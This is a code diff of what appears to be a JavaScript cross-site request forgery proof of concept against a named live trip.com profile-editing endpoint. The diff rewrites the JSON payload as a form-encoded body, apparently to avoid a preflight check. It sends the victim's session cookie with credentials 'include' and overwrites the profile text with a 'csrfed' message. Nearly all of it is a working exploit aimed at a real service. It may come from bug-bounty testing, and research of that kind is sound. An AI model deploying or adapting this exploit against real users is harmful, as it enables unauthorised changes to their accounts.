@@ -12,31 +12,23 @@
         // Target endpoint configuration
         const targetUrl = "https://in.trip.com/restapi/soa2/18066/editUserIntroduction";
         
-        // Exact JSON payload structure mapped from your Caido request
-        const payloadData = {
+        // URL-encoded payload structure
+        const payloadData = new URLSearchParams({
             "content": "Hi, you have been csrfed\n, yo",
-            "head": {
-                "cver": "1.0",
-                "cid": "",
-                "locale": "en-IN",
-                "currency": "BRL",
-                "extension": [
-                    {"name": "locale", "value": "en-IN"},
-                    {"name": "platform", "value": "Online"},
-                    {"name": "currency", "value": "BRL"},
-                    {"name": "clientIp", "value": "127.0.0.1"}
-                ]
-            }
-        };
+            "locale": "en-IN",
+            "currency": "BRL",
+            "platform": "Online",
+            "clientIp": "127.0.0.1"
+        });
 
         // Configuration object for cross-origin tracking
         const requestOptions = {
             method: 'POST',
             headers: {
-                'Content-Type': 'application/json',
+                'Content-Type': 'application/x-www-form-urlencoded',
                 'x-ctx-locale': 'en-IN' // Custom tracking header required by the API path
             },
-            body: JSON.stringify(payloadData),
+            body: payloadData.toString(),
             // CRITICAL: Instructs Chrome to include the SameSite=None 'cticket' session cookie
             credentials: 'include' 
         };
